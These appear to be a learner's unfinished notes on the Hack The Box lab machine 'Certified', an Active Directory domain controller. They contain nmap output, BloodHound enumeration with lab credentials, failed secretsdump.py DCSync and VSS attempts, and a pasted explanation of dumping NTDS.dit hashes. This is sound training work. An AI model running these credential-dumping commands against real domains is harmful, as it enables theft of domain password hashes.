link = https://app.hackthebox.com/machines/633

# Port scanning

**rustscan**

```bash

```

**nmap**

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-15 23:43:53Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-15T23:45:29+00:00; +7h00m25s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Issuer: commonName=certified-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-11T21:05:29
| Not valid after:  2105-05-23T21:05:29
| MD5:   ac8a:4187:4d19:237f:7cfa:de61:b5b2:941f
|_SHA-1: 85f1:ada4:c000:4cd3:13de:d1c2:f3c6:58f7:7134:d397
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-15T23:45:29+00:00; +7h00m25s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Issuer: commonName=certified-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-11T21:05:29
| Not valid after:  2105-05-23T21:05:29
| MD5:   ac8a:4187:4d19:237f:7cfa:de61:b5b2:941f
|_SHA-1: 85f1:ada4:c000:4cd3:13de:d1c2:f3c6:58f7:7134:d397
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Issuer: commonName=certified-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-11T21:05:29
| Not valid after:  2105-05-23T21:05:29
| MD5:   ac8a:4187:4d19:237f:7cfa:de61:b5b2:941f
|_SHA-1: 85f1:ada4:c000:4cd3:13de:d1c2:f3c6:58f7:7134:d397
|_ssl-date: 2025-10-15T23:45:29+00:00; +7h00m25s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Issuer: commonName=certified-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-11T21:05:29
| Not valid after:  2105-05-23T21:05:29
| MD5:   ac8a:4187:4d19:237f:7cfa:de61:b5b2:941f
|_SHA-1: 85f1:ada4:c000:4cd3:13de:d1c2:f3c6:58f7:7134:d397
|_ssl-date: 2025-10-15T23:45:29+00:00; +7h00m25s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
49727/tcp open  msrpc         Microsoft Windows RPC
62989/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-15T23:44:49
|_  start_date: N/A
|_clock-skew: mean: 7h00m24s, deviation: 0s, median: 7h00m24s

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   76.08 ms 10.10.14.1
2   76.31 ms 10.129.231.186

NSE: Script Post-scanning.
Initiating NSE at 11:45
Completed NSE at 11:45, 0.00s elapsed
Initiating NSE at 11:45
Completed NSE at 11:45, 0.00s elapsed
Initiating NSE at 11:45
Completed NSE at 11:45, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 215.97 seconds
           Raw packets sent: 131243 (5.779MB) | Rcvd: 1738 (164.195KB)

```

**Ports**

53 - DNS
88 - Kerberos authentication
135 - RPC (Remote Procedure Call)
139 - NetBIOS Session Service
389 - LDAP (Lightweight Directory Access Protocol)
445 - SMB (Server Message Block) - file sharing
464 - Kerberos password change
593 - RPC over HTTP
636 - LDAPS (LDAP over SSL/TLS)
5985 - WinRM HTTP (Windows Remote Management)
9389 - Active Directory Web Services
49666+ - Dynamic RPC ports

# Enumeration

## LDAP

Domain is `DC01.certified.htb`

## Web (Port 5985)

any port responds with a 404

## Bloodhound

Start bloodhound and add user Juditn:-

```bash
└──╼ [★]$ bloodhound-python -d certified.htb -u judith.mader -p 'judith09' -ns 10.129.45.146 -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: certified.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.certified.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.certified.htb
INFO: Found 10 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.certified.htb
INFO: Done in 00M 17S
```

running analysis

```txt
juddith.madden
write owner --> MANAGEMENT@CERTIFIED.HTB
genericwrite --> MANAGEMENT_SVC@CERTIFIED.HTB
CanPSRemote --> DC01.CERTIFIED.HTB (computer)
DCSync --> CERTIFIED.HTB (Domain)
Contains --> USERS@CERTIFIED.HTB
Contains --> DOMAIN_ADMINS@CERTIFIED.HTB
```

Trying to DCSync on CERTIFIED.HTB (Domain) does not work

```bash
[*] Cleaning up...└──╼ [★]$ secretsdump.py 'certified.htb/judith.mader:judith09@dc01.certified.htb'
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
[*] Cleaning up... 

┌─[eu-dedivip-1]─[10.10.14.80]─[julien23@htb-ziyy6gzaho]─[~/box]
└──╼ [★]$ secretsdump.py 'certified.htb/judith.mader:judith09@certified.htb' -use-vss
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Cleaning up... 
```

> ### Explanation
> secretsdump.py - What It Does:
> Purpose: Dumps credentials/secrets from Windows systems, specifically:
> 
> - NTLM password hashes from NTDS.dit (Active Directory database)
> - Local SAM hashes
> - LSA secrets
> - Cached domain credentials
> 
> #### The -use-vss Flag:
> This changes HOW it dumps the data. There are two main methods:
>
> ##### Method 1: DRSUAPI (Default - DCSync)
> bashsecretsdump.py 'domain/user:pass@target'
> 
> Uses replication protocols (pretends to be a DC)
> Requires DCSync permissions (DS-Replication rights)
> Goes over RPC (ports 135 + dynamic)
> Remote - doesn't touch the filesystem
> This is what you tried first and got the error
> 
> ##### Method 2: VSS (Volume Shadow Service)
> bashsecretsdump.py 'domain/user:pass@target' -use-vss
> 
> Creates a Volume Shadow Copy of the C: drive
> Extracts NTDS.dit and SYSTEM registry hive from the shadow copy
> Parses them locally to extract hashes
> Requires local admin rights on the target
> Goes over SMB (port 445)
> Leaves more forensic artifacts (shadow copy creation)

this is a dud and I have no idea what is going on








# Creds

Username: judith.mader Password: judith09

# References

[bloodyAD](https://github.com/CravateRouge/bloodyAD.git) - need to write nots on
[bloodhound](#) - need to write notes
[AD Privelege Escalation](#) - need to write notes
